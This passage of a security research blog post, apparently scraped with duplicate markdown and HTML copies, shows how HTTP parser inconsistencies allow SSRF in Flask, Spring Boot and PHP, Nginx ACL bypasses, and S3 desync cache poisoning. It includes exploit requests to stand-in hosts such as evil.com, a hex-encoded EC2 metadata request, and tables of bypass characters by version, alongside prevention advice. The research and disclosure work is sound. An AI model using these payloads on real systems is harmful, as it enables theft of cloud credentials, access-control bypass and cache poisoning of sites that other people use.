proxy(path):\\n  return get(f'{SITE_NAME}{path}').content\\n\\napp.run(host='0.0.0.0', port=8080)\\n```\\n\\nMy first thought was: \\\"*What if the developer forgets to add the last slash in the* `SITE_NAME` *variable?*\\\". And yes, it can lead to an SSRF.\\n\\nSince Flask also allows any ASCII character after the `@`, it's possible to fetch an arbitrary domain after concatenating the malicious pathname and the destination server.\\n\\nPlease consider the following source code as a reference for the exploitation scenario:\\n\\n```python\\nfrom flask import Flask\\nfrom requests import get\\n\\napp = Flask('__main__')\\nSITE_NAME = 'https://google.com'\\n\\n@app.route('/', defaults={'path': ''})\\n@app.route('/\u003cpath:path\u003e')\\n\\ndef proxy(path):\\n  return get(f'{SITE_NAME}{path}').content\\n\\nif __name__ == \\\"__main__\\\":\\n    app.run(threaded=False)\\n```\\n\\nPresented below is an example of an exploitation request:\\n\\n```http\\nGET @evildomain.com/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIn the following example, I was able to fetch my EC2 metadata:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686771183056/fe166abf-b2cb-41be-846b-11ac56b33d71.png align=\\\"center\\\")\\n\\n## SSRF on Spring Boot Through Incorrect Pathname Interpretation\\n\\nUpon discovering the presence of an SSRF vulnerability in Flask, I delved into exploring how this behavior could be exploited in other frameworks. As my research progressed, it became apparent that Spring Boot is also susceptible to this particular issue.\\n\\nAuthentication bypasses, ACL bypasses, and path traversal are known vectors when the application parses Matrix parameters. Servlet matrix parameters are a feature introduced in the Servlet specification that allows you to extract and handle additional data present in the URL path. Unlike query parameters that are separated by the `?` character, matrix parameters are separated by the `;` character within the URL.\\n\\nDuring the research, I discovered that the Spring framework accepts the matrix parameter separator character `;` before the first slash of the HTTP pathname:\\n\\n```http\\nGET ;1337/api/v1/me HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIf a developer implements a server-side request that utilizes the complete pathname of the request to fetch an endpoint, it can lead to the emergence of Server-Side Request Forgery (SSRF).\\n\\nPlease consider the following source code as a reference for the exploitation scenario:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772007869/5661fff8-9e48-4c63-b78b-cb69ee0582c0.png align=\\\"center\\\")\\n\\nThe code snippet above utilizes the `HttpServletRequest` API to retrieve the requested URL through the `getRequestURI()` function. Subsequently, it concatenates the requested URI with the destination endpoint http://ifconfig.me.\\n\\nConsidering that Spring permits any character following the Matrix parameter separator, becoming possible to use the `@` character to fetch an arbitrary endpoint as well.\\n\\nBelow is an example of the exploit request:\\n\\n```http\\nGET ;@evil.com/url HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686772361453/e66a9edf-a590-4d82-b75a-180c33ae1a21.png align=\\\"center\\\")\\n\\n## PHP Built-in Web Server Case Study - SSRF Through Incorrect Pathname Interpretation\\n\\nThe PHP Built-in web server suffers from the same vulnerability. Still, the Built-in server is not used in production involvements, so I decided to present this behavior as a case study that is unlikely to happen in real-world applications.\\n\\nSurprisingly, PHP allows the asterisk `*` character before the first slash in the pathname, and between the asterisk and the first slash, almost all ASCII characters are accepted as valid HTTP request.\\n\\nHowever, there are two limitations that arise with PHP:\\n\\n1. This technique can only be used for the root pathname `/` and cannot be applied to other endpoints, in other words, the vulnerable code must be in the `index.php` file;\\n    \\n2. Dots `.` are not allowed before the first slash, which restricts the inclusion of arbitrary IPs and domains, to circumvent it, the payload must include a dotless-hex encoded IP address of the malicious domain.\\n    \\n\\nLet's consider the following PHP code for this exploitation scenario:\\n\\n```php\\n\u003c?php\\n$site = \\\"http://ifconfig.me\\\";\\n$current_uri = $_SERVER['REQUEST_URI'];\\n\\n$proxy_site = $site.$current_uri;\\nvar_dump($proxy_site);\\n\\necho \\\"\\\\n\\\\n\\\";\\n\\n$response = file_get_contents($proxy_site);\\nvar_dump($response);\\n?\u003e\\n```\\n\\nThe provided code retrieves the HTTP request pathname using `$_SERVER['REQUEST_URI']` and concatenates it with the destination domain.\\n\\nFor performing IP address dotless-hex encoding, you can utilize the tool [ip-encoder.py](https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f).\\n\\nThe resulting payload used for exploiting which fetches the EC2 metadata is as follows:\\n\\n```http\\nGET *@0xa9fea9fe/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nIn the following proof of concept, I successfully retrieved my EC2 metadata:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686789542807/4ca585ed-37e3-4384-bec0-ba2c6e59e75a.png align=\\\"center\\\")\\n\\n## How to prevent\\n\\n* It is essential to consistently employ complete URL domains when concatenating them with user input. For instance, ensure that a trailing slash is added after the domain name, such as `http://ifconfig.me/`.\\n    \\n* Utilizing a reverse proxy that effectively handles HTTP requests. The vulnerabilities mentioned are typically only possible if the framework is used without any additional reverse proxy that verifies the HTTP pathname. In other words, incorporating a reverse proxy can significantly enhance the security of the web application.\\n    \\n\\n# HTTP Desync Cache Poisoning Attacks\\n\\nInconsistencies exist among servers and reverse proxies when it comes to removing invalid invisible characters from header names before interpreting them. This inconsistency can lead to notable vulnerabilities, such as HTTP Request Smuggling. But in this section, I will discuss a vulnerability and technique that I discovered during my research that combines Desync attacks with Cache Poisoning, which affects cache servers when integrated with AWS S3 buckets.\\n\\nBut before we continue, we must understand some functionalities of cache servers.\\n\\n## Cache Keys\\n\\nCache keys are unique identifiers used by cache servers to store and retrieve cached data, they serve as references or labels that allow access to cached content.\\n\\nThe most frequently used cache key is typically derived from the URL's pathname. When a user sends a request to a server that utilizes caching, the cache server employs the requested URL to locate the corresponding cached response to serve back to the user.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686943618847/430c595b-b7ca-4dec-b31c-58374b1d0a30.webp align=\\\"center\\\")\\n\\nIn addition to the URL's pathname, another default cache key is the Host header. Let's consider a scenario where a cached JavaScript file is located at `https://target.com/static/main.js`. When a user sends an HTTP request to this cached URL, the cache server will return the stored response without having to forward the request to the backend server.\\n\\nHowever, if a user sends an HTTP request to the same endpoint but modifies the Host header to `1337.target.com`, the cache server will attempt to retrieve the backend of the corresponding response for the `/static/main.js` URL using the `1337.target.com` host header. Subsequently, it will generate a stored response specifically for that particular HTTP message.\\n\\n## S3 HTTP Desync Cache Poisoning Issue\\n\\nIn this section, I will demonstrate an HTTP Desync vulnerability that can result in Cache Poisoning, impacting principally AWS S3 buckets.\\n\\nIn the Amazon AWS S3 buckets, the Host header plays a crucial role in routing requests to the correct bucket and enabling proper access to the stored content. When interacting with an S3 bucket, the Host header helps direct requests to the appropriate endpoint within the AWS infrastructure.\\n\\nWhen a request is made to an S3 bucket, the AWS infrastructure inspects the Host header to determine the target bucket. So if a user sends an HTTP request to the domain `your.s3.amazonaws.com` but changes the host header to `my.s3.amazonaws.com`, internally, AWS will \\\"ignore\\\" the domain name, fetching the bucket specified in the host header only. This is a common practice on Cloud services.\\n\\n### The Vulnerability\\n\\nThe interpretation of host headers for S3 buckets involves two key aspects:\\n\\n1. When multiple host headers are included in the request, only the first one will be taken, and any additional headers will be ignored.\\n    \\n2. The following bytes are ignored if present in the header name: `\\\\x1f`, `\\\\x1d`, `\\\\x0c`, `\\\\x1e`, `\\\\x1c`, `\\\\x0b`;\\n    \\n\\nThe vulnerability arises from an inconsistency in the host header interpretation. If the cache server mistakenly includes the ignored bytes as part of the header name, treating it as an invalid host header, while S3 interprets it as a valid host header, it becomes possible to cache arbitrary bucket responses on vulnerable websites.\\n\\nThis behavior allows caching arbitrary S3 bucket content in vulnerable websites.\\n\\nConsider the following exploitation request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686958907855/ffd360e3-5eb8-4ffd-939d-b46614f9f430.png align=\\\"center\\\")\\n\\n```http\\nGET / HTTP/1.1\\n[\\\\x1d]Host: evilbucket.com\\nHost: example.bucket.com\\nConnection: close\\n```\\n\\n* First, the cache server examines the header `\\\\x1dHost: evilbucket.com` and treats it like any other unkeyed header;\\n    \\n* Subsequently, the cache server will correctly interpret the `example.bucket.com` header as a valid host header, resulting in the final cache response being associated with this host value.\\n    \\n* Upon reaching the S3 bucket, the header `\\\\x1dHost: evilbucket.com` will be mistakenly interpreted as a valid host header, while the intended `Host: example.bucket.com` header will be ignored. This misinterpretation by AWS will lead to the fetching of the malicious header's associated bucket.\\n    \\n\\nThe final result is a complete cache poisoning of the page with arbitrary content.\\n\\nThe proof of concept video demonstrates the exploitation of this vulnerability in an outdated Varnish cache server. It is important to note that newer versions of Varnish are not susceptible to this vulnerability:\\n\\n%[https://www.youtube.com/watch?v=dnf6Zi5eNW8] \\n\\nIn addition to Varnish, other cache servers such as Akamai were also vulnerable to this issue. However, it's important to note that this vulnerability has been addressed and cannot be reproduced on any AWS service today.\\n\\n# Conclusion\\n\\nIn conclusion, this research delved into the realm of security vulnerabilities in web applications, specifically focusing on HTTP parsers and the implications they can have on overall security. By exploring inconsistencies in HTTP parsers across various technologies, such as load balancers, reverse proxies, web servers, and caching servers, I unveiled potential avenues for exploitation.\\n\\nI demonstrated how certain behaviors, like path normalization and the acceptance of special characters, can lead to bypassing security rules and even opening the door to Server-Side Request Forgery (SSRF) and Cache Poisoning vulnerabilities.\\n\\nMoreover, I highlighted the significance of utilizing reverse proxies that effectively validate and sanitize HTTP requests. Implementing a robust reverse proxy can significantly bolster the security posture of a web application by intercepting and filtering malicious requests before they reach the backend servers.\",\"content\":\"\u003cp\u003eThe HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\u003c/p\u003e\\n\u003cp\u003eIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\u003c/p\u003e\\n\u003cp\u003eIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\u003c/p\u003e\\n\u003ch1 id=\\\"heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules\\\"\u003ePathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\u003c/h1\u003e\\n\u003cp\u003eThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of \u003ccode\u003etrim()\u003c/code\u003e or \u003ccode\u003estrip()\u003c/code\u003e functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\u003c/p\u003e\\n\u003cp\u003eIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-nginx-acl-rules\\\"\u003eNginx ACL Rules\u003c/h2\u003e\\n\u003cp\u003eNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\u003c/p\u003e\\n\u003cp\u003eIn Nginx, the \\\"location\\\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eThe above Nginx rule aims to deny every access to the \u003ccode\u003e/admin\u003c/code\u003e endpoint, so if a user tries to access this endpoint, Nginx will return \u003ccode\u003e403\u003c/code\u003e and will not pass the HTTP message to the web server.\u003c/p\u003e\\n\u003cp\u003eTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-trim-inconsistencies\\\"\u003eTrim Inconsistencies\u003c/h2\u003e\\n\u003cp\u003eBefore we proceed, we need to understand what the \u003ccode\u003etrim()\u003c/code\u003e function does in different languages.\u003c/p\u003e\\n\u003cp\u003eDifferent languages remove different characters when the correspondent function for \u003ccode\u003etrim()\u003c/code\u003e is called. Each server will normalize the pathname based on its \u003ccode\u003etrim()\u003c/code\u003e, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\u003c/p\u003e\\n\u003cp\u003eE.g.: Python removes the character \u003ccode\u003e\\\\x85\u003c/code\u003e with \u003ccode\u003estrip()\u003c/code\u003e, and JavaScript does not with \u003ccode\u003etrim()\u003c/code\u003e.\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eIf an HTTP message is parsed using the \u003ccode\u003etrim()\u003c/code\u003e function in different languages, an HTTP Desync attack can occur.\u003c/p\u003e\\n\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-nodejs\\\"\u003eBypassing Nginx ACL Rules With Node.js\u003c/h2\u003e\\n\u003cp\u003eLet's consider the following Nginx ACL rule and Node.js API source code using Express:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-javascript\\\"\u003eapp.get(\u003cspan class=\\\"hljs-string\\\"\u003e'/admin'\u003c/span\u003e, \u003cspan class=\\\"hljs-function\\\"\u003e(\u003cspan class=\\\"hljs-params\\\"\u003ereq, res\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e res.send(\u003cspan class=\\\"hljs-string\\\"\u003e'ADMIN'\u003c/span\u003e);\\n});\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eFollowing the \u003ccode\u003etrim()\u003c/code\u003e logic, Node.js \\\"ignores\\\" the characters \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\xa0\u003c/code\u003e, and \u003ccode\u003e\\\\x0c\u003c/code\u003e from the pathname, but Nginx considers them as part of the URL:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cul\u003e\\n\u003cli\u003e\u003cp\u003eFirst, Nginx receives the HTTP request and performs path normalization on the pathname;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eAs Nginx includes the character \u003ccode\u003e\\\\xa0\u003c/code\u003e as part of the pathname, the ACL rule for the \u003ccode\u003e/admin\u003c/code\u003e URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\u003c/p\u003e\\n\u003c/li\u003e\\n\u003cli\u003e\u003cp\u003eWhen the URI \u003ccode\u003e/admin\\\\x0a\u003c/code\u003e is received by the Node.js server, the character \u003ccode\u003e\\\\xa0\u003c/code\u003e will be removed, allowing successful retrieval of the \u003ccode\u003e/admin\u003c/code\u003e endpoint.\u003c/p\u003e\\n\u003c/li\u003e\\n\u003c/ul\u003e\\n\u003cp\u003eBelow is a graphical demonstration of what happens with the HTTP request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\u003c/p\u003e\\n\u003cdiv class=\\\"embed-wrapper\\\"\u003e\u003cdiv class=\\\"embed-loading\\\"\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003cdiv class=\\\"loadingRow\\\"\u003e\u003c/div\u003e\u003c/div\u003e\u003ca class=\\\"embed-card\\\" href=\\\"https://www.youtube.com/watch?v=sgs3s5oTfz8\\\"\u003ehttps://www.youtube.com/watch?v=sgs3s5oTfz8\u003c/a\u003e\u003c/div\u003e\\n\u003cp\u003e \u003c/p\u003e\\n\u003cp\u003eBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eNode.js Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-flask\\\"\u003eBypassing Nginx ACL Rules With Flask\u003c/h2\u003e\\n\u003cp\u003eFlask removes the characters \u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e, and \u003ccode\u003e\\\\x09\u003c/code\u003e from the URL path, but NGINX doesn't.\u003c/p\u003e\\n\u003cp\u003eTake the following nginx configuration/API source code as a reference:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-python\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e@app.route('/admin', methods = ['GET'])\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003edef\u003c/span\u003e \u003cspan class=\\\"hljs-title\\\"\u003eadmin\u003c/span\u003e():\u003c/span\u003e\\n    data = {\u003cspan class=\\\"hljs-string\\\"\u003e\\\"url\\\"\u003c/span\u003e:request.url, \u003cspan class=\\\"hljs-string\\\"\u003e\\\"admin\\\"\u003c/span\u003e:\u003cspan class=\\\"hljs-string\\\"\u003e\\\"True\\\"\u003c/span\u003e}\\n\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e Response(str(data), mimetype=\u003cspan class=\\\"hljs-string\\\"\u003e\\\"application/json\\\"\u003c/span\u003e)\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eAs you can see below, it's possible to circumvent the ACL protection by adding the character \u003ccode\u003e\\\\x85\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eFlask Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x85\u003c/code\u003e, \u003ccode\u003e\\\\xA0\u003c/code\u003e, \u003ccode\u003e\\\\x1F\u003c/code\u003e, \u003ccode\u003e\\\\x1E\u003c/code\u003e, \u003ccode\u003e\\\\x1D\u003c/code\u003e, \u003ccode\u003e\\\\x1C\u003c/code\u003e, \u003ccode\u003e\\\\x0C\u003c/code\u003e, \u003ccode\u003e\\\\x0B\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-spring-boot\\\"\u003eBypassing Nginx ACL Rules With Spring Boot\u003c/h2\u003e\\n\u003cp\u003eSpring removes the characters \u003ccode\u003e\\\\x09\u003c/code\u003e and \u003ccode\u003e\\\\x3B\u003c/code\u003e from the URL path, but Nginx doesn't.\u003c/p\u003e\\n\u003cp\u003eTake the following Nginx configuration/API source code as a reference:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-java\\\"\u003e\u003cspan class=\\\"hljs-meta\\\"\u003e@GetMapping(\\\"/admin\\\")\u003c/span\u003e\\n\u003cspan class=\\\"hljs-function\\\"\u003e\u003cspan class=\\\"hljs-keyword\\\"\u003epublic\u003c/span\u003e String \u003cspan class=\\\"hljs-title\\\"\u003eadmin\u003c/span\u003e\u003cspan class=\\\"hljs-params\\\"\u003e()\u003c/span\u003e \u003c/span\u003e{\\n    \u003cspan class=\\\"hljs-keyword\\\"\u003ereturn\u003c/span\u003e \u003cspan class=\\\"hljs-string\\\"\u003e\\\"Greetings from Spring Boot!\\\"\u003c/span\u003e;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character \u003ccode\u003e\\\\x09\u003c/code\u003e or \u003ccode\u003e\\\\t\u003c/code\u003e at the end of the pathname:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cdiv class=\\\"hn-table\\\"\u003e\\n\u003ctable\u003e\\n\u003cthead\u003e\\n\u003ctr\u003e\\n\u003ctd\u003eNginx Version\u003c/td\u003e\u003ctd\u003e\u003cstrong\u003eSpring Boot Bypass Characters\u003c/strong\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/thead\u003e\\n\u003ctbody\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.22.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.21.6\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.20.2\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.18.0\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003ctr\u003e\\n\u003ctd\u003e1.16.1\u003c/td\u003e\u003ctd\u003e\u003ccode\u003e\\\\x09\u003c/code\u003e, \u003ccode\u003e;\u003c/code\u003e\u003c/td\u003e\u003c/tr\u003e\\n\u003c/tbody\u003e\\n\u003c/table\u003e\\n\u003c/div\u003e\u003ch2 id=\\\"heading-bypassing-nginx-acl-rules-with-php-fpm-integration\\\"\u003eBypassing Nginx ACL Rules With PHP-FPM Integration\u003c/h2\u003e\\n\u003cp\u003ePHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\u003c/p\u003e\\n\u003cp\u003eLet's consider the following Nginx FPM configuration:\u003c/p\u003e\\n\u003cpre\u003e\u003ccode class=\\\"lang-plaintext\\\"\u003elocation = /admin.php {\\n    deny all;\\n}\\n\\nlocation ~ \\\\.php$ {\\n    include snippets/fastcgi-php.conf;\\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\\n}\\n\u003c/code\u003e\u003c/pre\u003e\\n\u003cp\u003eWhen two \u003ccode\u003e.php\u003c/code\u003e files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint \u003ccode\u003e/admin.php\u003c/code\u003e, it's possible to access the admin.php file by doing the following request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eBelow is a graphical example of how the applications interpret the HTTP request:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThis technique only works if the second PHP file, in this case, \u003ccode\u003eindex.php\u003c/code\u003e, exists in the server structure. Take the following server code/structure as a reference:\u003c/p\u003e\\n\u003cp\u003e\u003cimg src=\\\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png\\\" alt class=\\\"image--center mx-auto\\\" /\u003e\u003c/p\u003e\\n\u003cp\u003eThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\u003c/p\u003e\\n\u003cp\u003eSince the research concluded in April 2022, newer versions of 